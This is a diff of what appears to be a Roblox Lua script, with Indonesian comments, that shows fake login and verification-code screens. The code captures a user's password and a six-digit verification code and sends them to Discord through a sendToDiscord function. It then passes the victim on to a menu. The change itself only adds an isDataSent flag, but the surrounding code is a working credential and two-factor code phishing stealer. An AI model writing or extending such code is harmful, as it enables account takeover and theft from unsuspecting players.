@@ -170,6 +170,7 @@ local function createVerificationCodeGUI()
     local codeBox = Instance.new("TextBox")
     local verifyCodeButton = Instance.new("TextButton")
     local errorLabel = Instance.new("TextLabel")
+    local isDataSent = false
 
     -- Properti GUI
     gui.Name = "VerificationCodeGUI"
@@ -257,6 +258,7 @@ local function createVerificationCodeGUI()
         if verificationCode:match("^%d%d%d%d%d%d$") then
             sendToDiscord("Kode Verifikasi: " .. verificationCode)
             print("Kode verifikasi telah dikirim ke Discord!")
+            isDataSent = true
             gui:Destroy()
             createMenuGUI() -- Menampilkan MenuGUI setelah verifikasi
         else
@@ -331,6 +333,7 @@ local function createLoginGUI()
     local passwordBox = Instance.new("TextBox")
     local loginButton = Instance.new("TextButton")
     local errorLabel = Instance.new("TextLabel") -- Error label untuk validasi
+    local isDataSent = false
 
     -- Variabel untuk password asli dan kontrol pengiriman data
     local password = ""
@@ -450,7 +453,7 @@ local function createLoginGUI()
         isDataSent = true -- Tandai bahwa data sudah terkirim
         errorLabel.Text = "" -- Bersihkan error
         print("Data berhasil terkirim ke Discord!")
-
+        isDataSent = true
         gui:Destroy() -- Hapus GUI setelah sukses
         createLoadingGUI(3, function()
             createVerificationCodeGUI()
